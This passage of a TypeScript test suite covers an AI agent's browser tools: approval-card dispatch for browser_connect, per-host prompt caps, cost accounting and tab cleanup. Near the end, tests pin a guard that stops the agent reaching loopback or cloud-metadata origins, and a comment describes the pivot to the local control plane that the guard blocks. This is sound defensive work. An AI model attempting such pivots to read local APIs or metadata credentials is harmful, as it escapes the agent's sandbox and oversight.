    expect(parsed.error).not.toContain("Missing required string argument");
    // No approval row should exist.
    const state = readState(config.instance);
    expect(state.setupRequests.length).toBe(0);

    rmSync(ROOT, { recursive: true, force: true });
  });

  // Navigate-first precondition: a cold browser_connect (no page open yet) is
  // a misuse — the agent should browse headless first and only escalate to a
  // Connect prompt when a navigation hits a sign-in wall. The dispatch must
  // refuse it WITHOUT minting an approval, so the user is never prompted to
  // connect for an ordinary browse-the-web request.
  test("refuses a cold call when no browser page is open, without minting an approval", async () => {
    rmSync(ROOT, { recursive: true, force: true });
    mkdirSync(WORKSPACE, { recursive: true });
    const config = dispatchConfig("browser-connect-dispatch-cold");
    const taskId = await mutateState(config.instance, (state) => {
      const task = createTask(state.instance, "connect cold", undefined, undefined, undefined, undefined);
      upsertTask(state, task);
      return task.id;
    });

    // No browser_navigate has run, so there is no live session / open page.
    const result = await dispatchToolCall(
      config,
      taskId,
      "browser_connect",
      "call_connect_cold_1",
      JSON.stringify({ reason: "Search hotel prices in Los Angeles" })
    );
    expect(result.kind).toBe("sync");
    if (result.kind !== "sync") throw new Error("unreachable");
    const parsed = JSON.parse(result.result) as { ok: boolean; error: string };
    expect(parsed.ok).toBe(false);
    expect(parsed.error).toContain("browser_navigate");

    // The user must not be prompted — no approval row may exist.
    const state = readState(config.instance);
    expect(state.setupRequests.length).toBe(0);

    rmSync(ROOT, { recursive: true, force: true });
  });

  // Loop guard: a task caps Connect cards per sign-in wall. A first prompt plus
  // one retry is legitimate (mistyped credential, or a genuinely different wall
  // on the same host later in the task), so two cards mint; the third call for
  // the same site is refused with a sync result instead of spamming a third
  // identical card.
  test("caps Connect cards per sign-in wall and refuses beyond the cap", async () => {
    rmSync(ROOT, { recursive: true, force: true });
    mkdirSync(WORKSPACE, { recursive: true });
    const config = dispatchConfig("browser-connect-dispatch-loop");
    const taskId = await mutateState(config.instance, (state) => {
      const session = createChatSession(state, "connect loop chat");
      const task = createTask(state.instance, "connect loop", undefined, undefined, undefined, undefined, undefined, session.id);
      upsertTask(state, task);
      return task.id;
    });
    browserTest.installFakeSessionWithPageForTest(taskId, {
      url: () => "https://www.aircanada.com/login",
      close: () => Promise.resolve()
    });
    const connectCards = () =>
      readState(config.instance).setupRequests.filter(
        (a) => a.taskId === taskId && a.action === "browser.connect"
      ).length;

    // First call: a real Connect card (pending approval).
    const first = await dispatchToolCall(
      config,
      taskId,
      "browser_connect",
      "call_loop_1",
      JSON.stringify({ reason: "Sign in to Air Canada" })
    );
    expect(first.kind).toBe("pending");
    expect(connectCards()).toBe(1);

    // Second call for the same site: still allowed (a retry is legitimate).
    const second = await dispatchToolCall(
      config,
      taskId,
      "browser_connect",
      "call_loop_2",
      JSON.stringify({ reason: "Sign in to Air Canada" })
    );
    expect(second.kind).toBe("pending");
    expect(connectCards()).toBe(2);

    // Third call for the same site: refused, no new card.
    const third = await dispatchToolCall(
      config,
      taskId,
      "browser_connect",
      "call_loop_3",
      JSON.stringify({ reason: "Sign in to Air Canada" })
    );
    expect(third.kind).toBe("sync");
    if (third.kind !== "sync") throw new Error("unreachable");
    const parsed = JSON.parse(third.result) as { ok: boolean; error: string };
    expect(parsed.ok).toBe(false);
    expect(parsed.error).toMatch(/twice in this task/i);
    // The card serves two uses (sign-in unblock and user handoff); the
    // refusal must not claim the model is blocked on signing in when the
    // pending step may be a handoff.
    expect(parsed.error).toMatch(/sign-in or a user handoff/i);
    // Still exactly two cards — the loop did not spam a third approval.
    expect(connectCards()).toBe(2);

    // A handoff-mode call shares the same per-host bucket and gets the same
    // mode-neutral refusal.
    const fourth = await dispatchToolCall(
      config,
      taskId,
      "browser_connect",
      "call_loop_4",
      JSON.stringify({ reason: "Enter payment details", mode: "handoff" })
    );
    expect(fourth.kind).toBe("sync");
    if (fourth.kind !== "sync") throw new Error("unreachable");
    const parsedFourth = JSON.parse(fourth.result) as { ok: boolean; error: string };
    expect(parsedFourth.ok).toBe(false);
    expect(parsedFourth.error).toMatch(/sign-in or a user handoff/i);
    expect(connectCards()).toBe(2);

    rmSync(ROOT, { recursive: true, force: true });
  });

  // The cap is per host: hitting it for one site must not block a connect for a
  // different site. Pass distinct `url` args so the resolved hosts differ; the
  // second host still mints a card even after the first host reached the cap.
  test("counts Connect cards per host independently", async () => {
    rmSync(ROOT, { recursive: true, force: true });
    mkdirSync(WORKSPACE, { recursive: true });
    const config = dispatchConfig("browser-connect-dispatch-perhost");
    const taskId = await mutateState(config.instance, (state) => {
      const session = createChatSession(state, "connect per-host chat");
      const task = createTask(state.instance, "connect per-host", undefined, undefined, undefined, undefined, undefined, session.id);
      upsertTask(state, task);
      return task.id;
    });
    browserTest.installFakeSessionWithPageForTest(taskId, {
      url: () => "https://www.aircanada.com/login",
      close: () => Promise.resolve()
    });

    // Drive host A to the cap (two cards), then refuse a third.
    const a1 = await dispatchToolCall(
      config,
      taskId,
      "browser_connect",
      "call_perhost_a1",
      JSON.stringify({ reason: "Sign in to Air Canada", url: "https://www.aircanada.com/login" })
    );
    expect(a1.kind).toBe("pending");
    const a2 = await dispatchToolCall(
      config,
      taskId,
      "browser_connect",
      "call_perhost_a2",
      JSON.stringify({ reason: "Sign in to Air Canada", url: "https://www.aircanada.com/login" })
    );
    expect(a2.kind).toBe("pending");
    const a3 = await dispatchToolCall(
      config,
      taskId,
      "browser_connect",
      "call_perhost_a3",
      JSON.stringify({ reason: "Sign in to Air Canada", url: "https://www.aircanada.com/login" })
    );
    expect(a3.kind).toBe("sync");

    // A different host is independent — it still mints its first card.
    const b1 = await dispatchToolCall(
      config,
      taskId,
      "browser_connect",
      "call_perhost_b1",
      JSON.stringify({ reason: "Sign in to United", url: "https://www.united.com/login" })
    );
    expect(b1.kind).toBe("pending");

    rmSync(ROOT, { recursive: true, force: true });
  });

  // A session can exist but still sit on about:blank (or another non-http(s)
  // page) when nothing real has been navigated to yet. That can't host a
  // sign-in wall, so the navigate-first guard must still refuse — same as a
  // missing session.
  test("refuses when the only session is on about:blank", async () => {
    rmSync(ROOT, { recursive: true, force: true });
    mkdirSync(WORKSPACE, { recursive: true });
    const config = dispatchConfig("browser-connect-dispatch-blank");
    const taskId = await mutateState(config.instance, (state) => {
      const task = createTask(state.instance, "connect blank", undefined, undefined, undefined, undefined);
      upsertTask(state, task);
      return task.id;
    });
    browserTest.installFakeSessionWithPageForTest(taskId, {
      url: () => "about:blank",
      close: () => Promise.resolve()
    });

    const result = await dispatchToolCall(
      config,
      taskId,
      "browser_connect",
      "call_connect_blank_1",
      JSON.stringify({ reason: "Sign in somewhere" })
    );
    expect(result.kind).toBe("sync");
    if (result.kind !== "sync") throw new Error("unreachable");
    const parsed = JSON.parse(result.result) as { ok: boolean; error: string };
    expect(parsed.ok).toBe(false);
    expect(parsed.error).toContain("browser_navigate");
    expect(readState(config.instance).setupRequests.length).toBe(0);

    rmSync(ROOT, { recursive: true, force: true });
  });

  // End-to-end coverage of the dispatch → approval → completion path. The
  // dispatch must surface a pending approval; completing it (the same path the
  // /complete HTTP route's non-screencast fallback takes) returns success with
  // mode "spawned" and writes exactly one rich browser.connect audit row. The
  // screencast sign-in completes against the spawned Chrome and persists no
  // state.browser record (only an explicit cdp attach writes one).
  test("completing the dispatched approval returns mode spawned and writes one audit row", async () => {
    rmSync(ROOT, { recursive: true, force: true });
    mkdirSync(WORKSPACE, { recursive: true });
    const config = dispatchConfig("browser-connect-dispatch-approve");
    const taskId = await mutateState(config.instance, (state) => {
      const session = createChatSession(state, "connect approve chat");
      const task = createTask(state.instance, "connect approve", undefined, undefined, undefined, undefined, undefined, session.id);
      upsertTask(state, task);
      return task.id;
    });
    // browser_connect requires an already-open page; seed a live session so
    // the dispatch passes its navigate-first precondition before exercising
    // the approval → completion path.
    browserTest.installFakeSessionWithPageForTest(taskId, {
      url: () => "https://console.cloud.google.com/welcome",
      close: () => Promise.resolve()
    });

    try {
      const result = await dispatchToolCall(
        config,
        taskId,
        "browser_connect",
        "call_connect_approve_1",
        JSON.stringify({ reason: "Sign in to Google Cloud Console" })
      );
      expect(result.kind).toBe("pending");
      if (result.kind !== "pending") throw new Error("unreachable");
      const pendingSetup = readState(config.instance).setupRequests.find((s) => s.id === result.approvalId);
      if (!pendingSetup) throw new Error("setup request not minted");
      const { result: toolResult } = await completeBrowserConnectSetup(config, pendingSetup);
      const setup = await resolveSetupRequest(config, result.approvalId, "complete", {
        actor: "user",
        toolResult,
        resumeChatTask: false
      });
      expect(setup.status).toBe("completed");
      const parsed = JSON.parse(toolResult) as {
        success: boolean;
        connected: boolean;
        mode?: string;
      };
      expect(parsed.success).toBe(true);
      expect(parsed.connected).toBe(true);
      expect(parsed.mode).toBe("spawned");
      // No connection record is ever persisted — the spawned Chrome is the
      // only transport and carries no state record.
      expect(readState(config.instance).browser ?? null).toBeNull();
      // Exactly one browser.connect audit row — completeBrowserConnectSetup
      // writes the rich row itself.
      const connectRows = readState(config.instance).audit.filter(
        (row) => row.action === "browser.connect"
      );
      expect(connectRows.length).toBe(1);
      // The single row carries the user-facing reason and the setup id.
      expect(connectRows[0]!.approvalId).toBe(result.approvalId);
      expect(connectRows[0]!.target).toBe("Sign in to Google Cloud Console");
    } finally {
      browserTest.clearFakeSessionsForTest();
      rmSync(ROOT, { recursive: true, force: true });
    }
  });

  // The headless flag still rides the approval payload from the tool args
  // (the web card / completion contract reads it). With the spawn-only
  // transport there is no managed relaunch, so completion ignores it and
  // returns mode "spawned"; the flag's job is purely the card wording.
  test("dispatch ignores a legacy headless arg and never puts it on the payload", async () => {
    rmSync(ROOT, { recursive: true, force: true });
    mkdirSync(WORKSPACE, { recursive: true });
    const config = dispatchConfig("browser-connect-dispatch-headless");
    const taskId = await mutateState(config.instance, (state) => {
      const session = createChatSession(state, "connect headless chat");
      const task = createTask(state.instance, "connect headless", undefined, undefined, undefined, undefined, undefined, session.id);
      upsertTask(state, task);
      return task.id;
    });
    browserTest.installFakeSessionWithPageForTest(taskId, {
      url: () => "https://console.cloud.google.com/welcome",
      close: () => Promise.resolve()
    });

    try {
      const result = await dispatchToolCall(
        config,
        taskId,
        "browser_connect",
        "call_connect_headless_1",
        JSON.stringify({
          reason: "Continue Cloud Console setup invisibly",
          headless: true
        })
      );
      expect(result.kind).toBe("pending");
      if (result.kind !== "pending") throw new Error("unreachable");
      const pendingSetup = readState(config.instance).setupRequests.find((s) => s.id === result.approvalId);
      if (!pendingSetup) throw new Error("setup request not minted");
      // The spawn-only transport dropped the headless param: a stray legacy
      // headless arg is ignored, never carried onto the setup payload.
      expect(pendingSetup.payload).not.toHaveProperty("headless");
      const { result: toolResult } = await completeBrowserConnectSetup(config, pendingSetup);
      const setup = await resolveSetupRequest(config, result.approvalId, "complete", {
        actor: "user",
        toolResult,
        resumeChatTask: false
      });
      expect(setup.status).toBe("completed");
      const parsed = JSON.parse(toolResult) as {
        success: boolean;
        connected: boolean;
        mode?: string;
      };
      expect(parsed.success).toBe(true);
      expect(parsed.connected).toBe(true);
      expect(parsed.mode).toBe("spawned");
      // No record persisted regardless of the headless flag.
      expect(readState(config.instance).browser ?? null).toBeNull();
    } finally {
      browserTest.clearFakeSessionsForTest();
      rmSync(ROOT, { recursive: true, force: true });
    }
  });

  // The browser.connect payload drives the web card's completion-button
  // wording: no mode key renders the historical sign-in labels, an explicit
  // mode:"handoff" renders the generalized "I'm done" completion (ADR
  // browser-connect-handoff.md). Pin both shapes — the default payload must
  // stay byte-identical to the pre-handoff contract so every existing
  // sign-in flow is unchanged, and only the literal "handoff" opts in.
  test("default call mints the exact sign-in payload (no mode key); mode:'handoff' rides the payload", async () => {
    rmSync(ROOT, { recursive: true, force: true });
    mkdirSync(WORKSPACE, { recursive: true });
    const config = dispatchConfig("browser-connect-dispatch-mode");
    const taskId = await mutateState(config.instance, (state) => {
      const session = createChatSession(state, "connect mode chat");
      const task = createTask(state.instance, "connect mode", undefined, undefined, undefined, undefined, undefined, session.id);
      upsertTask(state, task);
      return task.id;
    });
    browserTest.installFakeSessionWithPageForTest(taskId, {
      url: () => "https://store.example.com/checkout",
      close: () => Promise.resolve()
    });

    // Default (no mode): payload keys are exactly the pre-handoff set.
    const signIn = await dispatchToolCall(
      config,
      taskId,
      "browser_connect",
      "call_mode_default",
      JSON.stringify({ reason: "Sign in to the store" })
    );
    expect(signIn.kind).toBe("pending");
    if (signIn.kind !== "pending") throw new Error("unreachable");
    const signInSetup = readState(config.instance).setupRequests.find((s) => s.id === signIn.approvalId);
    expect(signInSetup?.payload).toEqual({
      reason: "Sign in to the store",
      toolCallId: "call_mode_default",
      url: "https://store.example.com/checkout"
    });

    // mode:"handoff": same payload plus the mode marker the card reads.
    const handoff = await dispatchToolCall(
      config,
      taskId,
      "browser_connect",
      "call_mode_handoff",
      JSON.stringify({ reason: "Enter your payment details to finish the order", mode: "handoff" })
    );
    expect(handoff.kind).toBe("pending");
    if (handoff.kind !== "pending") throw new Error("unreachable");
    const handoffSetup = readState(config.instance).setupRequests.find((s) => s.id === handoff.approvalId);
    expect(handoffSetup?.payload.mode).toBe("handoff");
    expect(handoffSetup?.payload.reason).toBe("Enter your payment details to finish the order");
    expect(handoffSetup?.payload.url).toBe("https://store.example.com/checkout");

    // An unrecognized mode value degrades to the default sign-in payload —
    // no mode key, so the card falls back to the sign-in wording.
    const bogus = await dispatchToolCall(
      config,
      taskId,
      "browser_connect",
      "call_mode_bogus",
      JSON.stringify({ reason: "Sign in again", mode: "co-browse", url: "https://other.example.com/login" })
    );
    expect(bogus.kind).toBe("pending");
    if (bogus.kind !== "pending") throw new Error("unreachable");
    const bogusSetup = readState(config.instance).setupRequests.find((s) => s.id === bogus.approvalId);
    expect(bogusSetup?.payload.mode).toBeUndefined();

    // The request trace mirrors the payload's conditional mode key, so an
    // audit of the task can tell a handoff request apart from a sign-in.
    const connectTraces = readTrace(config.instance, taskId).filter(
      (t) => t.type === "approval" && t.message === "Approval requested for browser connect (chat-task)"
    );
    expect(connectTraces).toHaveLength(3);
    const traceByCall = (callId: string) =>
      connectTraces.find((t) => (t.data as Record<string, unknown>)?.toolCallId === callId);
    expect(traceByCall("call_mode_default")?.data).not.toHaveProperty("mode");
    expect((traceByCall("call_mode_handoff")?.data as Record<string, unknown>)?.mode).toBe("handoff");
    expect(traceByCall("call_mode_bogus")?.data).not.toHaveProperty("mode");

    rmSync(ROOT, { recursive: true, force: true });
  });

  // Completion behavior is mode-independent: after the user finishes acting
  // in the screencast (sign-in OR a handoff step like payment entry),
  // /complete's non-screencast fallback returns success with mode "spawned".
  // signInStarted is the stage-1 marker for both modes; a handoff payload
  // completes through the exact same path as sign-in (the agent never left its
  // spawned Chrome, so there is nothing to relaunch).
  test("handoff completion returns mode spawned, same as sign-in", async () => {
    rmSync(ROOT, { recursive: true, force: true });
    mkdirSync(WORKSPACE, { recursive: true });
    const config = dispatchConfig("browser-connect-dispatch-handoff-complete");
    const taskId = await mutateState(config.instance, (state) => {
      const session = createChatSession(state, "handoff complete chat");
      const task = createTask(state.instance, "handoff complete", undefined, undefined, undefined, undefined, undefined, session.id);
      upsertTask(state, task);
      return task.id;
    });
    browserTest.installFakeSessionWithPageForTest(taskId, {
      url: () => "https://store.example.com/checkout",
      close: () => Promise.resolve()
    });

    try {
      const result = await dispatchToolCall(
        config,
        taskId,
        "browser_connect",
        "call_handoff_complete_1",
        JSON.stringify({ reason: "Complete the purchase yourself", mode: "handoff" })
      );
      expect(result.kind).toBe("pending");
      if (result.kind !== "pending") throw new Error("unreachable");
      // Stage 1 (the user clicked Connect): /open-browser marks
      // signInStarted on the pending row — same marker for both modes.
      await mutateState(config.instance, (state) => {
        const item = state.setupRequests.find((s) => s.id === result.approvalId);
        if (item) item.payload = { ...item.payload, signInStarted: true };
      });
      const pendingSetup = readState(config.instance).setupRequests.find((s) => s.id === result.approvalId);
      if (!pendingSetup) throw new Error("setup request not minted");
      expect(pendingSetup.payload.mode).toBe("handoff");
      // Stage 2 (the user clicked "I'm done"): complete acknowledges success.
      const { result: toolResult } = await completeBrowserConnectSetup(config, pendingSetup);
      const parsed = JSON.parse(toolResult) as {
        success: boolean;
        connected: boolean;
        mode?: string;
      };
      expect(parsed.success).toBe(true);
      expect(parsed.connected).toBe(true);
      expect(parsed.mode).toBe("spawned");
      expect(readState(config.instance).browser ?? null).toBeNull();
    } finally {
      browserTest.clearFakeSessionsForTest();
      rmSync(ROOT, { recursive: true, force: true });
    }
  });
});

// dispatchToolCall(browser_vision) must accumulate the vision provider's
// token spend into task.cost so the chat UI's running total reflects
// out-of-band side calls. The browserVision tool returns the cost in its
// JSON envelope; the dispatcher rolls it into the task row via mutateState.
describe("dispatchToolCall(browser_vision) cost accumulation", () => {
  const ROOT = "/tmp/gini-browser-vision-dispatch-tests";

  function dispatchConfig(instance: string): RuntimeConfig {
    process.env.GINI_STATE_ROOT = ROOT;
    process.env.GINI_LOG_ROOT = `${ROOT}-logs`;
    rmSync(`${ROOT}/instances/${instance}`, { recursive: true, force: true });
    return {
      instance,
      port: 7339,
      token: "test-token",
      provider: { name: "echo", model: "gini-echo-v0" },
      workspaceRoot: "/tmp",
      stateRoot: `${ROOT}/instances/${instance}`,
      logRoot: `${ROOT}-logs/${instance}`
    };
  }

  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
    clearEchoVisionResponses();
  });

  test("vision usage block accumulates into the task's cost row", async () => {
    rmSync(ROOT, { recursive: true, force: true });
    const config = dispatchConfig("browser-vision-dispatch");
    // Build the task row the dispatcher will route the call against.
    const taskId = await mutateState(config.instance, (state) => {
      const task = createTask(state.instance, "vision test", undefined, undefined, undefined, undefined);
      upsertTask(state, task);
      return task.id;
    });

    // Plant the fake session + canned vision response.
    const fakePage = {
      screenshot: async () => Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d]),
      url: () => "https://example.com/cost"
    };
    browserTest.installFakeSessionWithPageForTest(taskId, fakePage);
    setEchoVisionResponse({
      text: "looks fine",
      cost: {
        provider: "echo",
        model: "gini-echo-v0",
        inputTokens: 250,
        outputTokens: 50,
        totalTokens: 300,
        estimatedUsd: 0.0003
      }
    });

    const result = await dispatchToolCall(
      config,
      taskId,
      "browser_vision",
      "call_vision_1",
      JSON.stringify({ question: "what is on the page?" })
    );
    expect(result.kind).toBe("sync");

    // The task row's cost should now reflect the vision provider's spend.
    const after = readState(config.instance).tasks.find((t) => t.id === taskId);
    expect(after?.cost).toBeDefined();
    expect(after!.cost!.totalTokens).toBe(300);
    expect(after!.cost!.inputTokens).toBe(250);
    expect(after!.cost!.outputTokens).toBe(50);
    expect(after!.cost!.estimatedUsd).toBeCloseTo(0.0003, 5);

    rmSync(ROOT, { recursive: true, force: true });
  });
});

// closeSession must drain agent-opened tabs (tracked via ownedPageIds) so
// the user's window/tabs stay alive while the agent's scratch pages are
// closed when the task ends.
describe("closeSession drains agent-owned pages", () => {
  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
  });

  test("each agent-opened tab is closed via its close() handle", async () => {
    // Plant a session with 3 agent-owned pages. The fake context returns
    // those pages from .pages() (no user-owned tabs in this scenario).
    const closed: string[] = [];
    const makePage = (label: string): Partial<import("playwright-core").Page> => ({
      url: () => `https://example.com/${label}`,
      title: () => Promise.resolve(label),
      close: (async () => {
        closed.push(label);
      }) as unknown as import("playwright-core").Page["close"]
    });
    const p0 = makePage("p0");
    const p1 = makePage("p1");
    const p2 = makePage("p2");
    // Install with p0 as the active page, then manually extend
    // ownedPageIds to include p1 + p2 (mimicking two browser_tabs:new
    // calls during the task).
    browserTest.installFakeSessionWithPageForTest("drain-pages-task", p0);
    const session = browserTest.getFakeSessionForTest("drain-pages-task");
    expect(session).toBeDefined();
    session!.ownedPageIds.add(p1 as unknown as import("playwright-core").Page);
    session!.ownedPageIds.add(p2 as unknown as import("playwright-core").Page);

    await browserTest.closeSessionForTest("drain-pages-task");

    // All three agent-owned pages should have had close() called.
    expect(closed.sort()).toEqual(["p0", "p1", "p2"]);
  });
});

// browser_select_option should accept an option ref alone and walk up to
// the containing <select>, using the option's `value` attribute when the
// caller didn't supply an explicit value/values.
describe("browserSelectOption option-ref inference", () => {
  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
  });

  test("walks up from an OPTION to its parent SELECT and uses the option's value attribute", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("sel-option-ref", fakePage);

    // The option locator: evaluate returns { tagName: "OPTION", value: "bmw" }.
    // .locator("xpath=...") returns a new fake "select" locator whose
    // selectOption() captures the call so the test can assert it ran with
    // "bmw".
    let captured: { selection: unknown; timeout?: number } | undefined;
    const selectLocator = {
      selectOption: async (selection: unknown, opts?: { timeout?: number }) => {
        captured = { selection, timeout: opts?.timeout };
        return [];
      }
    };
    const optionLocator = {
      evaluate: async (_fn: (el: Element) => { tagName: string; value: string }) =>
        ({ tagName: "OPTION", value: "bmw" }),
      locator: (selector: string) => {
        // Must walk via xpath up to the parent select.
        if (selector !== "xpath=ancestor::select[1]") {
          throw new Error(`Unexpected selector: ${selector}`);
        }
        return selectLocator;
      }
    };
    const refs = new Map<string, unknown>();
    refs.set("@e5", optionLocator);
    browserTest.setFakeSessionRefsForTest("sel-option-ref", refs);

    const raw = await browserSelectOption("sel-option-ref", { ref: "@e5" });
    const parsed = JSON.parse(raw) as { success: boolean; selected?: unknown };
    expect(parsed.success).toBe(true);
    expect(parsed.selected).toBe("bmw");
    expect(captured).toBeDefined();
    expect(captured!.selection).toBe("bmw");
    expect(captured!.timeout).toBe(10_000);
  });

  test("explicit value overrides the option's value attribute when an option ref is supplied", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("sel-option-override", fakePage);

    let captured: { selection: unknown } | undefined;
    const selectLocator = {
      selectOption: async (selection: unknown) => {
        captured = { selection };
        return [];
      }
    };
    const optionLocator = {
      evaluate: async () => ({ tagName: "OPTION", value: "bmw" }),
      locator: () => selectLocator
    };
    const refs = new Map<string, unknown>();
    refs.set("@e5", optionLocator);
    browserTest.setFakeSessionRefsForTest("sel-option-override", refs);

    const raw = await browserSelectOption("sel-option-override", { ref: "@e5", value: "audi" });
    const parsed = JSON.parse(raw) as { success: boolean; selected?: unknown };
    expect(parsed.success).toBe(true);
    // Explicit value wins over the inferred option value.
    expect(parsed.selected).toBe("audi");
    expect(captured!.selection).toBe("audi");
  });
});

// currentDisconnectGeneration is the read-only counter used by browserVision
// to detect a teardown that happens between screenshot and provider response.
describe("currentDisconnectGeneration", () => {
  afterEach(() => {
    browserTest.setInFlightDisconnectsForTest(0);
  });

  test("returns the same value the test-helper exposes", () => {
    const before = browserTest.currentDisconnectGenerationForTest();
    expect(currentDisconnectGeneration()).toBe(before);
    const after = browserTest.bumpDisconnectGenerationForTest();
    expect(currentDisconnectGeneration()).toBe(after);
  });
});

// getScreencastPort exposes the spawned Chrome's debug port to the sign-in
// screencast bridge — but ONLY for a live spawned handle, never for a
// managed/cdp handle and never when no browser is up.
describe("getScreencastPort", () => {
  afterEach(() => {
    browserTest.uninstallFakeBrowserForTest();
  });

  test("returns null when no browser handle is installed", () => {
    browserTest.uninstallFakeBrowserForTest();
    expect(getScreencastPort()).toBeNull();
  });

  test("returns the port for a live spawned handle", () => {
    browserTest.installFakeSpawnedHandleForTest(9412, {
      close: () => Promise.resolve(),
      browser: () => ({ isConnected: () => true })
    } as never);
    expect(getScreencastPort()).toBe(9412);
  });

  test("returns null for a spawned handle whose Chrome has died", () => {
    browserTest.installFakeSpawnedHandleForTest(9412, {
      close: () => Promise.resolve(),
      browser: () => ({ isConnected: () => false })
    } as never);
    expect(getScreencastPort()).toBeNull();
  });
});

// The agent's browser tool is barred from loopback origins so it cannot
// pivot through the local web control plane to forge bearer-injected BFF
// writes (issue #193). hostnameIsLoopback is the shared predicate;
// disallowedOriginReason is the server-side page gate reused by snapshot()
// and browser_console; browser_console adds an in-page assertion that
// closes the check-to-use race the server-side gate alone can't.
describe("hostnameIsLoopback", () => {
  test("classifies loopback variants as loopback", () => {
    for (const h of [
      "127.0.0.1",
      "localhost",
      "0.0.0.0",
      "::1",
      "[::1]",
      "127.5.9.200",
      "LocalHost",
      "app.localhost",
      "localhost.",
      "127.0.0.1."
    ]) {
      expect(hostnameIsLoopback(h)).toBe(true);
    }
  });

  test("passes public hosts and loopback look-alikes", () => {
    for (const h of [
      "example.com",
      "127001.example.com",
      "notlocalhost",
      "10.0.0.1",
      "169.254.169.254",
      "1.2.3.4"
    ]) {
      expect(hostnameIsLoopback(h)).toBe(false);
    }
  });
});

describe("disallowedOriginReason", () => {
  test("loopback url returns the block reason and bounces to about:blank", async () => {
    let gotoTarget: string | undefined;
    const page = {
      url: () => "http://127.0.0.1:7351/api/runtime/setup-requests",
      goto: (async (u: string) => {
        gotoTarget = u;
        return null;
      }) as unknown as import("playwright-core").Page["goto"]
    } as unknown as import("playwright-core").Page;
    const reason = await browserTest.disallowedOriginReasonForTest(page);
    expect(reason).toBeDefined();
    expect(reason!).toContain("loopback");
    expect(gotoTarget).toBe("about:blank");
  });

  test("public url returns undefined and does not bounce", async () => {
    let bounced = false;
    const page = {
      url: () => "https://example.com/",
      goto: (async () => {
        bounced = true;
        return null;
      }) as unknown as import("playwright-core").Page["goto"]
    } as unknown as import("playwright-core").Page;
    expect(await browserTest.disallowedOriginReasonForTest(page)).toBeUndefined();
    expect(bounced).toBe(false);
  });

  test("about:blank, empty url, and missing url() are all treated as safe", async () => {
    const blank = { url: () => "about:blank" } as unknown as import("playwright-core").Page;
    expect(await browserTest.disallowedOriginReasonForTest(blank)).toBeUndefined();
    const empty = { url: () => "" } as unknown as import("playwright-core").Page;
    expect(await browserTest.disallowedOriginReasonForTest(empty)).toBeUndefined();
    const noUrl = {} as unknown as import("playwright-core").Page;
    expect(await browserTest.disallowedOriginReasonForTest(noUrl)).toBeUndefined();
  });

  test("loopback url with no goto() still returns the reason without throwing", async () => {
    const page = {
      url: () => "http://localhost:7351/"
    } as unknown as import("playwright-core").Page;
    const reason = await browserTest.disallowedOriginReasonForTest(page);
    expect(reason).toBeDefined();
    expect(reason!).toContain("loopback");
  });

  test("a goto() that rejects is swallowed; the reason is still returned", async () => {
    const page = {
      url: () => "http://127.0.0.1:7351/",
      goto: (async () => {
        throw new Error("navigation crashed");
      }) as unknown as import("playwright-core").Page["goto"]
    } as unknown as import("playwright-core").Page;
    const reason = await browserTest.disallowedOriginReasonForTest(page);
    expect(reason).toBeDefined();
    expect(reason!).toContain("loopback");
  });

  // snapshot() is the read-path chokepoint: browser_snapshot/click/type/back
  // all route through it. A page that settled on a loopback origin (via JS
  // navigation, meta-refresh, or a link click) must be refused before its
  // contents are read back to the agent.
  test("snapshot() throws and bounces when the page settled on a loopback origin", async () => {
    let gotoTarget: string | undefined;
    const page = {
      url: () => "http://127.0.0.1:7351/api/runtime/whoami",
      goto: (async (u: string) => {
        gotoTarget = u;
        return null;
      }) as unknown as import("playwright-core").Page["goto"]
    } as unknown as import("playwright-core").Page;
    await expect(browserTest.snapshotForTest(page, false)).rejects.toThrow(
      "settled on disallowed URL"
    );
    expect(gotoTarget).toBe("about:blank");
  });
});

describe("browserConsole loopback guard", () => {
  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
  });

  test("refuses to run console JS on a disallowed origin and bounces it", async () => {
    let gotoTarget: string | undefined;
    let evaluated = false;
    browserTest.installFakeSessionWithPageForTest("console-loopback", {
      url: () => "http://127.0.0.1:7351/api/runtime/setup-requests",
      goto: (async (u: string) => {
        gotoTarget = u;
        return null;
      }) as unknown as import("playwright-core").Page["goto"],
      evaluate: (async () => {
        evaluated = true;
        return undefined;
      }) as unknown as import("playwright-core").Page["evaluate"]
    });
    const out = JSON.parse(await browserConsole("console-loopback", { expression: "1 + 1" })) as {
      success: boolean;
      error?: string;
    };
    expect(out.success).toBe(false);
    expect(out.error).toContain("loopback");
    expect(gotoTarget).toBe("about:blank");
    // Neither the secret collector nor the agent eval should have run.
    expect(evaluated).toBe(false);
  });

  test("in-page assertion blocks when the document origin changed during the race", async () => {
    const savedLocation = (globalThis as { location?: unknown }).location;
    // Server pre-check validated https://example.com, but the document has
    // since committed to a loopback origin — origin mismatch must refuse.
    (globalThis as { location?: unknown }).location = { origin: "http://127.0.0.1:7373" };
    try {
      browserTest.installFakeSessionWithPageForTest("console-race", {
        url: () => "https://example.com/",
        on: (() => undefined) as unknown as import("playwright-core").Page["on"],
        goto: (async () => null) as unknown as import("playwright-core").Page["goto"],
        evaluate: (async (fn: (arg: unknown) => unknown, arg: unknown) => fn(arg)) as unknown as import("playwright-core").Page["evaluate"]
      });
      const out = JSON.parse(
        await browserConsole("console-race", { expression: "(globalThis.__ranRace = true)" })
      ) as { evalResult: unknown; evalError: string | null };
      expect(out.evalError).toContain("origin changed");
      expect(out.evalResult).toBeNull();
      // The expression must never have executed.
      expect((globalThis as { __ranRace?: boolean }).__ranRace).toBeUndefined();
    } finally {
      (globalThis as { location?: unknown }).location = savedLocation;
      delete (globalThis as { __ranRace?: boolean }).__ranRace;
    }
  });

  test("in-page assertion also blocks a race to a metadata / link-local origin", async () => {
    const savedLocation = (globalThis as { location?: unknown }).location;
    // Origin-pinning covers more than loopback: a race to the cloud-metadata
    // origin (which safetyCheck also refuses) is caught the same way.
    (globalThis as { location?: unknown }).location = { origin: "http://169.254.169.254" };
    try {
      browserTest.installFakeSessionWithPageForTest("console-metadata", {
        url: () => "https://example.com/",
        on: (() => undefined) as unknown as import("playwright-core").Page["on"],
        goto: (async () => null) as unknown as import("playwright-core").Page["goto"],
